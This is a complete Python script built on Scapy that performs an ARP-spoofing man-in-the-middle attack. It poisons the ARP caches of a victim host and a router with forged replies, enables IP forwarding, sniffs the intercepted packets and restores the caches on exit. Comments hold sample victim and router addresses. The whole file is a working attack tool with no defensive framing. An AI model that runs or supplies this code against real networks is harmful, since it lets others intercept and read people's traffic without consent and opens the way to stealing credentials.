import os
import sys
from scapy.all import*

def MACsnag(IP):
    ans, unans = arping(IP)
    for s, r in ans:
        return r[Ether].src

def Spoof(routerIP, victimIP):
    victimMAC = MACsnag(victimIP)
    routerMAC = MACsnag(routerIP)
    send(ARP(op =2, pdst = victimIP, psrc = routerIP, hwdst = victimMAC))
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = routerMAC))

def Restore(routerIP, victimIP):
    victimMAC = MACsnag(victimIP)
    routerMAC = MACsnag(routerIP)
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4) 
    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)

def sniffer(interface):
    #pkts = sniff(iface = interface, count = 10, prn=lambda x:x.sprintf(" Source: %s : %s, \n %s \n\n Reciever: %s \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n" %(IP.src, Ether.src, Raw.load, IP.dst)))
    #sniff(iface = interface, prn = lambda x: x.show(), filter="tcp", store=0)
    sniff(iface=interface, prn=lambda pkt: "%s: %s" % (pkt.sniffed_on, pkt.summary()))
    #wrpcap("temp.pcap", pkts)

def MiddleMan():
    interface = input("interface: \n") #wlan0
    victimIP = input("victim: \n") #129.161.137.140     129.161.139.104
    routerIP= input("router: \n") #129.161.139.254 
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    while 1:
        try:
            Spoof(routerIP, victimIP)
            #time.sleep(1)
            sniffer(interface)
        except KeyboardInterrupt:
            Restore(routerIP, victimIP)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            sys.exit(1)


if __name__ == "__main__":
    MiddleMan()